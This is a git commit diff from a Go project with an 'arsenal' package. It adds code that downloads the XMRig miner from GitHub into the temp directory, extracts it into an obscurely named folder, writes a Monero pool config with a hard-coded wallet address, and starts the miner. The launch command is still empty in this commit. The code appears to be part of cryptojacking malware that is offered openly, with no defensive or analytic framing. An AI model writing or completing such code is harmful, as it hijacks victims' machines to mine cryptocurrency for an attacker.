82f313e4ab916b24658c214f3f67e1e586b5d9a2
siahaan <siahaan@kali>
2020-04-19 19:53:49 +0700

    added file writer and updated .gitignore

--- arsenal/cryptominer.go
+++ arsenal/cryptominer.go
@@ -1,33 +1,50 @@
 package arsenal
 
 import (
-	xid "github.com/rs/xid"
+	"os"
+	"os/exec"
 	"fmt"
-	"log"
 	"github.com/mholt/archiver/v3"
 	utils "../utils"
+	config "../config"
 )
 
+func intoTempDir(fname string) string {
+	return os.TempDir() + "/" + fname
+}
+
 func InitMiner(platform string) {
-	guid := xid.New()
-	bin := guid.String()
+	var fname string
 	switch platform {
 		case "windows":
-			err := utils.DownloadFile("https://github.com/xmrig/xmrig/releases/download/v5.11.0/xmrig-5.11.0-gcc-win64.zip", bin)
+			fname = intoTempDir("xmrig-5.11.0-gcc-win64.zip")
+			err := utils.DownloadFile("https://github.com/xmrig/xmrig/releases/download/v5.11.0/xmrig-5.11.0-gcc-win64.zip", fname)
 			if err != nil {
 				panic(err)
 			}
 		case "linux":
-			err := utils.DownloadFile("https://github.com/xmrig/xmrig/releases/download/v5.11.0/xmrig-5.11.0-xenial-x64.tar.gz", bin)
+			fname = intoTempDir("xmrig-5.11.0-xenial-x64.tar.gz")
+			err := utils.DownloadFile("https://github.com/xmrig/xmrig/releases/download/v5.11.0/xmrig-5.11.0-xenial-x64.tar.gz", fname)
 			if err != nil {
 				panic(err)
 			}
 		default:
-			log.Fatal("Cannot determine OS version, aborting...")
+			panic("Cannot determine OS version, aborting...")
 	}
-	err := Unarchive(bin, ".")
+	fmt.Println("Extracting, please wait...")
+	err := archiver.Unarchive(fname, intoTempDir("gsxsd"))
 	if err != nil {
-		log.Fatal(err)
+		panic(err)
 	}
-	
+	extractdir := "xmrig-5.11.0"
+	err = utils.WriteToFile(intoTempDir("gsxsd/monero.json"), config.MoneroConfig)
+	if err != nil {
+		panic(err)
+	}
+	cmd := exec.Command("")
+	cmd.Dir = intoTempDir("gsxsd/" + extractdir)
+	_, err = cmd.Output()
+    if err != nil {
+        panic(err)
+    }
 }
---
+++ config/monero.go
@@ -0,0 +1,20 @@
+package config
+
+var MoneroConfig = `
+    {
+        "autosave": true,
+        "donate-level": 1,
+        "cpu": true,
+        "opencl": false,
+        "cuda": false,
+        "pools": [
+            {
+                "url": "sg.minexmr.com:443",
+                "user": "43Kih5X9Gwk2ERBo4yMnFphD1pUmwZKvdX1LiRugNP3h2qV1RtQDFoAJenZyg61bEdg68FEHNvToP1YHDHAttyw86mXYMxM",
+                "rig-id": "Minefield",
+                "keepalive": true,
+                "tls": true
+            }
+        ]
+    }
+`
